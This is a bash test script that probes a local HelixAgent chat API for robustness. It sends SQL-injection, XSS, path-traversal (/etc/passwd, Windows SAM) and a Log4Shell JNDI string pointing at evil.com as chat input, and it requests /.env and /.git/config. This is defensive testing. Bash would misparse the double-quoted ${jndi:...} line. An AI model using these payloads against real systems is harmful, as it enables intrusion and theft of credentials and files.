#!/bin/bash
# Security Vulnerability Scanning Challenge
# Tests vulnerability scanning and detection

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/challenge_framework.sh"

CHALLENGE_PORT="${HELIXAGENT_PORT:-7061}"
BASE_URL="http://localhost:$CHALLENGE_PORT"

init_challenge "security-vulnerability-scanning" "Security Vulnerability Scanning Challenge"
load_env

log_info "Testing vulnerability scanning..."

test_common_vulnerabilities() {
    log_info "Test 1: Common vulnerability patterns blocked"

    local vuln_patterns=(
        "'; DROP TABLE users; --"
        "../../../etc/passwd"
        "<script>alert('xss')</script>"
        "${jndi:ldap://evil.com/a}"
    )

    local blocked=0

    for pattern in "${vuln_patterns[@]}"; do
        local resp=$(curl -s -w "\n%{http_code}" "$BASE_URL/v1/chat/completions" \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
            -d "{\"model\":\"helixagent-debate\",\"messages\":[{\"role\":\"user\",\"content\":\"$pattern\"}],\"max_tokens\":10}" \
            --max-time 30 2>/dev/null || true)

        local code=$(echo "$resp" | tail -n1)
        # Should handle safely (200 with sanitization or 400 rejection)
        [[ "$code" =~ ^(200|400)$ ]] && blocked=$((blocked + 1))
        [[ "$code" == "500" ]] && record_assertion "vuln_crash" "detected" "false" "Vulnerability caused crash"
    done

    record_metric "vulnerabilities_tested" ${#vuln_patterns[@]}
    [[ $blocked -ge 3 ]] && record_assertion "common_vulns" "protected" "true" "$blocked/${#vuln_patterns[@]} vulnerabilities protected"
}

test_information_disclosure() {
    log_info "Test 2: Information disclosure prevention"

    # Test various endpoints for info disclosure
    local endpoints=(
        "/.env"
        "/config"
        "/.git/config"
        "/admin"
    )

    local secure=0

    for endpoint in "${endpoints[@]}"; do
        local resp=$(curl -s -w "\n%{http_code}" "$BASE_URL$endpoint" --max-time 10 2>/dev/null || true)
        local code=$(echo "$resp" | tail -n1)

        # Should return 404/403 (not found/forbidden), not 200 with sensitive data
        [[ "$code" =~ ^(404|403)$ ]] && secure=$((secure + 1))
    done

    record_metric "info_disclosure_tests" ${#endpoints[@]}
    [[ $secure -ge 3 ]] && record_assertion "info_disclosure" "prevented" "true" "$secure/${#endpoints[@]} endpoints secure"
}

test_directory_traversal() {
    log_info "Test 3: Directory traversal protection"

    local traversal_attempts=(
        "../../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    )

    local protected=0

    for attempt in "${traversal_attempts[@]}"; do
        local resp=$(curl -s -w "\n%{http_code}" "$BASE_URL/v1/chat/completions" \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
            -d "{\"model\":\"helixagent-debate\",\"messages\":[{\"role\":\"user\",\"content\":\"$attempt\"}],\"max_tokens\":10}" \
            --max-time 30 2>/dev/null || true)

        local code=$(echo "$resp" | tail -n1)
        [[ "$code" =~ ^(200|400)$ ]] && protected=$((protected + 1))
    done

    record_metric "traversal_attempts" ${#traversal_attempts[@]}
    [[ $protected -ge 2 ]] && record_assertion "directory_traversal" "protected" "true" "$protected/${#traversal_attempts[@]} traversal attempts protected"
}

test_system_operational_after_scans() {
    log_info "Test 4: System operational after vulnerability scans"

    # Normal request should work
    local resp=$(curl -s -w "\n%{http_code}" "$BASE_URL/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
        -d '{"model":"helixagent-debate","messages":[{"role":"user","content":"Recovery test"}],"max_tokens":10}' \
        --max-time 30 2>/dev/null || true)

    [[ "$(echo "$resp" | tail -n1)" == "200" ]] && record_assertion "vuln_scan_recovery" "operational" "true" "System operational after vulnerability scans"
}

main() {
    log_info "Starting vulnerability scanning challenge..."

    if ! curl -s "$BASE_URL/health" > /dev/null 2>&1; then
        start_helixagent "$CHALLENGE_PORT" || { finalize_challenge "FAILED"; exit 1; }
    fi

    test_common_vulnerabilities
    test_information_disclosure
    test_directory_traversal
    test_system_operational_after_scans

    [[ "$(grep -c "|FAILED|" "$OUTPUT_DIR/logs/assertions.log" 2>/dev/null || echo 0)" -eq 0 ]] && finalize_challenge "PASSED" || finalize_challenge "FAILED"
}

main "$@"
